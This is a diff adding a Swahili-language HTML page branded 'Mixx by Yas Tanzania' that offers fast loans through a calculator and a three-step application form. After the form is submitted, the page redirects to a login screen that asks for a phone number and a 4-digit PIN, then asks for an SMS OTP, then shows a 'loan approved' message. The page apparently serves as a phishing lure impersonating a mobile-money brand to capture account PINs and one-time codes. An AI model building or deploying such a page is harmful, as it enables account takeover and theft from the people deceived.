@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mixx by Yas Tanzania – Mikopo ya Haraka na Rahisi</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="app-container">
+        <header class="app-header">
+            <div class="logo">Mixx<span>Yas</span></div>
+        </header>
+
+        <section id="view-landing" class="app-view active">
+            <div class="hero-section">
+                <h1>Pata Mkopo Wako Haraka</h1>
+                <p>Idhini ya haraka • Riba nafuu • Muda rahisi</p>
+            </div>
+
+            <div class="calculator-card">
+                <h2>Kikokotoo cha Mkopo</h2>
+                <div class="input-group">
+                    <div class="label-row">
+                        <label>Kiasi cha Mkopo</label>
+                        <span id="calc-amount-val">TSh 100,000</span>
+                    </div>
+                    <input type="range" id="calc-amount" min="10000" max="10000000" step="10000" value="100000">
+                    <div class="range-limits"><span>TSh 10K</span><span>TSh 10M</span></div>
+                </div>
+
+                <div class="input-group">
+                    <div class="label-row">
+                        <label>Muda wa Mkopo</label>
+                        <span id="calc-duration-val">miezi 12</span>
+                    </div>
+                    <input type="range" id="calc-duration" min="6" max="60" step="6" value="12">
+                    <div class="range-limits"><span>miezi 6</span><span>miezi 60</span></div>
+                </div>
+
+                <div class="result-box">
+                    <p class="result-label">Malipo ya Kila Mwezi</p>
+                    <p class="result-value" id="calc-monthly-payment">TSh 9,363</p>
+                </div>
+                <button class="btn btn-primary btn-block" onclick="navigateTo('view-step1')">OMBA SASA</button>
+            </div>
+
+            <div class="features-grid">
+                <div class="feature-item"><span class="icon">⚡</span><h4>Idhini ya Haraka</h4><p>Ndani ya masaa 24</p></div>
+                <div class="feature-item"><span class="icon">💰</span><h4>Riba Nafuu</h4><p>Kuanzia 25%</p></div>
+                <div class="feature-item"><span class="icon">🔒</span><h4>Salama</h4><p>Kiwango cha benki</p></div>
+            </div>
+        </section>
+
+        <section id="view-step1" class="app-view">
+            <div class="back-nav" onclick="navigateTo('view-landing')">← Rudi</div>
+            <h2>Maombi ya Mkopo</h2>
+            <p class="step-indicator">Hatua 1 ya 3</p>
+            <form id="form-step1" onsubmit="event.preventDefault(); saveStep1();">
+                <div class="form-group">
+                    <label>Aina ya Mkopo</label>
+                    <select id="loan-type" required>
+                        <option value="Mkopo wa Binafsi">Mkopo wa Binafsi</option>
+                        <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Kiasi cha Mkopo (TSh)</label>
+                    <input type="number" id="loan-amount" required>
+                </div>
+                <div class="form-group">
+                    <label>Muda wa Mkopo</label>
+                    <select id="loan-duration" required>
+                        <option value="12">Miezi 12</option>
+                        <option value="24">Miezi 24</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Madhumuni ya Mkopo</label>
+                    <input type="text" id="loan-purpose" placeholder="Mfano: Biashara" required>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block">HATUA INAYOFUATA</button>
+            </form>
+        </section>
+
+        <section id="view-step2" class="app-view">
+            <div class="back-nav" onclick="navigateTo('view-step1')">← Rudi</div>
+            <h2>Maombi ya Mkopo</h2>
+            <p class="step-indicator">Hatua 2 ya 3</p>
+            <form id="form-step2" onsubmit="event.preventDefault(); saveStep2();">
+                <div class="form-row">
+                    <div class="form-group"><label>Jina la Kwanza</label><input type="text" id="first-name" required></div>
+                    <div class="form-group"><label>Jina la Ukoo</label><input type="text" id="last-name" required></div>
+                </div>
+                <div class="form-group"><label>Barua Pepe</label><input type="email" id="email" required></div>
+                <div class="form-group">
+                    <label>Nambari ya Simu</label>
+                    <div class="phone-input-wrapper">
+                        <span class="prefix">🇹🇿 +255</span>
+                        <input type="tel" id="phone" placeholder="712345678" required>
+                    </div>
+                </div>
+                <div class="btn-group">
+                    <button type="button" class="btn btn-secondary" onclick="navigateTo('view-step1')">ILIYOTANGULIA</button>
+                    <button type="submit" class="btn btn-primary">HATUA INAYOFUATA</button>
+                </div>
+            </form>
+        </section>
+
+        <section id="view-step3" class="app-view">
+            <div class="back-nav" onclick="navigateTo('view-step2')">← Rudi</div>
+            <h2>Maombi ya Mkopo</h2>
+            <p class="step-indicator">Hatua 3 ya 3</p>
+            <form id="form-step3" onsubmit="event.preventDefault(); submitApplication();">
+                <div class="form-group">
+                    <label>Hali ya Ajira</label>
+                    <select id="employment-status" required>
+                        <option value="Mwajiriwa">Mwajiriwa</option>
+                        <option value="Mfanyabiashara">Mfanyabiashara</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Mapato ya Mwaka (TSh)</label>
+                    <input type="number" id="annual-income" required>
+                </div>
+                <div class="summary-box">
+                    <h3>Muhtasari wa Maombi</h3>
+                    <div class="summary-item"><span>Kiasi:</span> <strong id="sum-amount">TSh 0</strong></div>
+                    <div class="summary-item"><span>Muda:</span> <strong id="sum-duration">0 Miezi</strong></div>
+                    <div class="summary-item"><span>Mwombaji:</span> <strong id="sum-name">—</strong></div>
+                </div>
+                <div class="btn-group">
+                    <button type="button" class="btn btn-secondary" onclick="navigateTo('view-step2')">ILIYOTANGULIA</button>
+                    <button type="submit" class="btn btn-primary">WASILISHA MAOMBI</button>
+                </div>
+            </form>
+        </section>
+
+        <section id="view-success" class="app-view text-center">
+            <div class="success-icon">📋</div>
+            <h2>Maombi Yawasilishwa</h2>
+            <p>Tafadhali subiri idhini...</p>
+            <div class="loading-spinner"></div>
+            <p class="redirect-text">🔄 Unaelekezwa kuingia katika <span id="countdown">3</span>s...</p>
+        </section>
+
+        <section id="view-login" class="app-view">
+            <h2>Ingia Akaunti</h2>
+            <form id="form-login" onsubmit="event.preventDefault(); handleLogin();">
+                <div class="form-group">
+                    <label>Nambari ya Simu</label>
+                    <div class="phone-input-wrapper"><span class="prefix">🇹🇿 +255</span><input type="tel" id="login-phone" required></div>
+                </div>
+                <div class="form-group">
+                    <label>Weka PIN (tarakimu 4)</label>
+                    <input type="password" id="login-pin" maxlength="4" placeholder="••••" required>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block">INGIA</button>
+            </form>
+        </section>
+
+        <section id="view-otp" class="app-view text-center">
+            <h2>Uthibitisho wa OTP</h2>
+            <p>Weka OTP iliyotumwa kwenye simu yako</p>
+            <div class="otp-inputs">
+                <input type="text" class="otp-box" maxlength="1" onkeyup="moveOtpFocus(this, 'otp2')" id="otp1">
+                <input type="text" class="otp-box" maxlength="1" onkeyup="moveOtpFocus(this, 'otp3')" id="otp2">
+                <input type="text" class="otp-box" maxlength="1" onkeyup="moveOtpFocus(this, 'otp4')" id="otp3">
+                <input type="text" class="otp-box" maxlength="1" id="otp4">
+            </div>
+            <button class="btn btn-primary btn-block" onclick="verifyOtp()">WASILISHA</button>
+        </section>
+
+        <section id="view-dashboard" class="app-view text-center">
+            <div class="success-banner"><h3>🎉 Hongera! Mkopo Umeidhinishwa!</h3></div>
+            <div class="approved-amount-card"><h2 id="dash-approved-amount">TSh 100,000</h2></div>
+            <p>Fedha zitatolewa kwenye akaunti yako hivi karibuni.</p>
+        </section>
+
+        <div id="loading-overlay" class="overlay hidden">
+            <div class="overlay-content">
+                <div class="loader-circle"></div>
+                <h3 id="overlay-msg">Tafadhali subiri…</h3>
+            </div>
+        </div>
+
+        <footer class="app-footer"><p>© 2026 Mixx by Yas Tanzania</p></footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
+  
